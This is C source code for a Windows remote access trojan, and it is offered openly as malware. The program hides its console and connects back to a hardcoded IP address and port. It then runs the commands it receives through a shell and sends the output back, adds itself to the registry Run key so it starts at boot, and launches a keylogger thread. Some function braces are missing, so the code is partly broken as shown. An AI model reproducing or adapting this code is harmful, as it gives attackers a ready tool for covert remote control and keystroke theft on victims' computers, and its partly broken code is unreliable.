#include <stdio.h>            // Standard input/output functions (e.g., printf, fgets)
#include <stdlib.h>           // General utilities (e.g., exit, malloc, calloc)
#include <unistd.h>           // POSIX functions (used here for chdir; works with MinGW)
#include <winsock2.h>         // Windows sockets API (networking functions)
#include <windows.h>          // Windows API core functions (file, process, threads)
#include <winuser.h>          // Windows user interface API (e.g., MessageBox)
#include <wininet.h>          // Windows internet functions (not used directly here)
#include <windowsx.h>         // Macros for Windows API (not used directly here)
#include <string.h>           // String handling functions (e.g., strcpy, strcmp)
#include <sys/stat.h>         // File information (not used directly here)
#include <sys/types.h>        // Data type definitions (not used directly here)
#include "keylogger.h"        // Custom header for keylogger, defines `logg` thread function
#define bzero(p, size) (void) memset((p), 0, (size))   // Macro to zero memory (like in Linux)
int sock;   // Global socket descriptor used for communication
int bootRun()
	char err[128] = "Failed\n";   // Message to send if persistence fails
	char suc[128] = "Created Persistence At : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";  // Success message
	TCHAR szPath[MAX_PATH];   // Buffer to store the executable path
	DWORD pathLen = 0;        // Variable to hold path length
	pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);   // Get path of current executable
	if (pathLen == 0) {
		send(sock, err, sizeof(err), 0);   // Send failure message
		return -1;                         // Return with error
	}
	HKEY NewVal;  // Handle to registry key
	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
		send(sock, err, sizeof(err), 0);   // Open Run key in registry; if fail, send error
		return -1;
	}
	DWORD pathLenInBytes = pathLen * sizeof(*szPath);   // Length in bytes (Unicode support)
	if (RegSetValueEx(NewVal, TEXT("Hacked"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
		RegCloseKey(NewVal);         // Try to set registry key value to run this executable on boot
		send(sock, err, sizeof(err), 0);  // Send failure if setting fails
		return -1;
	}
	RegCloseKey(NewVal);     {     // Close the registry key handle
	send(sock, suc, sizeof(suc), 0);  // Send success message to server
	return 0;
}
char * str_cut(char str[], int slice_from, int slice_to)
        if (str[0] == '\0')    // If string is empty, return NULL
                return NULL;
        char *buffer;              // Final sliced string
        size_t str_len, buffer_len;   // Lengths
        if (slice_to < 0 && slice_from > slice_to) {
                str_len = strlen(str);   // Get total string length
                if (abs(slice_to) > str_len - 1)
                        return NULL;
                if (abs(slice_from) > str_len)
                        slice_from = (-1) * str_len;
                buffer_len = slice_to - slice_from;   // Calculate length
                str += (str_len + slice_from);        // Point to new start
        } else if (slice_from >= 0 && slice_to > slice_from) {
                str_len = strlen(str);

                if (slice_from > str_len - 1)
                        return NULL;
                buffer_len = slice_to - slice_from;
                str += slice_from;
        } else {
                return NULL;   // Invalid indices
        buffer = calloc(buffer_len, sizeof(char));    // Allocate memory for new string
        strncpy(buffer, str, buffer_len);             // Copy the slice
        return buffer;                                // Return sliced string
}
void Shell() {
	char buffer[1024];         // Received command
	char container[1024];      // Temporary read buffer for command output
	char total_response[18384]; // Full output to send back
	while (1) {
		jump:
		bzero(buffer,1024);
		bzero(container, sizeof(container));
		bzero(total_response, sizeof(total_response));
		recv(sock, buffer, 1024, 0);     // Receive command from server
		if (strncmp("q", buffer, 1) == 0) {
			closesocket(sock);      // If command starts with "q", close socket and exit
			WSACleanup();
			exit(0);
		}
		else if (strncmp("cd ", buffer, 3) == 0) {
			chdir(str_cut(buffer,3,100));   // If "cd ", change directory
		}
				else if (strncmp("persist", buffer, 7) == 0) {
			bootRun();    // If command is "persist", call bootRun()
		}
		else if (strncmp("keylog_start", buffer, 12) == 0) {
			HANDLE thread = CreateThread(NULL, 0,logg, NULL, 0, NULL);  // Start keylogger in new thread
			goto jump;    // Skip output step
		}
		else {
			FILE *fp;
			fp = _popen(buffer, "r");     // Execute shell command
			while(fgets(container,1024,fp) != NULL) {
				strcat(total_response, container);   // Collect output
			}
			send(sock, total_response, sizeof(total_response), 0);   // Send back output
			fclose(fp);
		}
	}
}
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){
	HWND stealth;
	AllocConsole();   // Allocate a console window
	stealth = FindWindowA("ConsoleWindowClass", NULL);  // Get handle to console window
	ShowWindow(stealth, 0);    // Hide console window
	struct sockaddr_in ServAddr;     // Server address structure
	unsigned short ServPort;         // Server port
	char *ServIP;                    // Server IP
	WSADATA wsaData;                 // WSA data structure
	ServIP = "192.168.1.6";    // Target server IP
	ServPort = 50005;          // Port to connect to
	if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {
		exit(1);      // Initialize Winsock; exit if fails
	}
	sock = socket(AF_INET, SOCK_STREAM, 0);    // Create TCP socket
	memset(&ServAddr, 0, sizeof(ServAddr));         // Zero out server address
	ServAddr.sin_family = AF_INET;                 // IPv4
	ServAddr.sin_addr.s_addr = inet_addr(ServIP);  // Set server IP
	ServAddr.sin_port = htons(ServPort);           // Set server port (network byte order)
	start:
	while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0)
	{
		Sleep(10);      // Try to connect every 10ms if fails
		goto start;
	}
	MessageBox(NULL, TEXT("Your Device Has Been Hacked!!!"), TEXT("Windows Installer"), MB_OK | MB_ICONERROR);  // Warning message
	Shell();   // Start shell loop
}

